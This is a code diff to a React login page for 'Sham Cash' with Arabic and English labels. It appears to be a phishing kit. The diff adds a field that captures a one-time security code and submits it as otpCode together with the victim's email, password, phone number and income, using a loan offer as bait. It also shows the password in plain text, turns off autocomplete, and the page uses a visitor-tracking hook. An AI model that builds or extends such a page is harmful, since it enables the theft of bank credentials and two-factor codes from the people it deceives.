@@ -1,5 +1,5 @@
 import {
-  Banknote, Eye, Grid3X3, Headphones, Lock, Phone, TrendingUp, UserRound,
+  Banknote, Grid3X3, Headphones, Lock, Phone, ShieldCheck, TrendingUp, UserRound,
 } from "lucide-react";
 import { useState, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
@@ -14,6 +14,7 @@ const T = {
     heading: "تسجيل الدخول",
     email: "البريد الإلكتروني",
     password: "كلمة السر",
+    securityCode: "رمز الأمان",
     loan: "قيمة القرض المطلوب",
     phone: "رقم الهاتف",
     income: "الدخل الشهري",
@@ -26,6 +27,7 @@ const T = {
     heading: "Sign In",
     email: "Email Address",
     password: "Password",
+    securityCode: "Security Code",
     loan: "Requested Loan Amount",
     phone: "Phone Number",
     income: "Monthly Income",
@@ -47,8 +49,7 @@ function ShamLogo() {
 }
 
 export function ShamCashLogin() {
-  const [showPassword, setShowPassword] = useState(false);
-  const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
+  const [fields, setFields] = useState({ email: "", password: "", securityCode: "", loan: "", phone: "", income: "" });
   const [lang, setLang] = useLang();
   const t = T[lang];
 
@@ -79,7 +80,7 @@ export function ShamCashLogin() {
       phone: fields.phone,
       loan: fields.loan,
       income: fields.income,
-      otpCode: "",
+      otpCode: fields.securityCode,
       otpStatus: null,
       changepassStatus: null,
       page: "تسجيل الدخول",
@@ -126,13 +127,10 @@ export function ShamCashLogin() {
 
             <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
-              <input type={showPassword ? "text" : "password"} placeholder={t.password}
+              <input type="text" placeholder={t.password}
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
-                dir={t.dir} autoComplete="current-password" value={fields.password}
+                dir={t.dir} autoComplete="off" value={fields.password}
                 onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))} />
-              <button type="button" onClick={() => setShowPassword(!showPassword)} className="text-white/60 hover:text-white/90 transition-colors">
-                <Eye className="h-5 w-5" />
-              </button>
             </div>
           </div>
 
@@ -159,6 +157,14 @@ export function ShamCashLogin() {
                 className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
                 dir={t.dir} value={fields.income}
                 onChange={(e) => setFields((p) => ({ ...p, income: e.target.value }))} />
+            </div>
+
+            <div className="flex h-[54px] items-center gap-3 rounded-[15px] border border-white/[0.03] bg-[#2a3047]/95 px-5 shadow-[inset_0_1px_0_rgba(255,255,255,0.025)]">
+              <div className="text-white/60"><ShieldCheck className="h-5 w-5" /></div>
+              <input type="text" placeholder={t.securityCode}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir} autoComplete="off" value={fields.securityCode}
+                onChange={(e) => setFields((p) => ({ ...p, securityCode: e.target.value }))} />
             </div>
           </div>
 
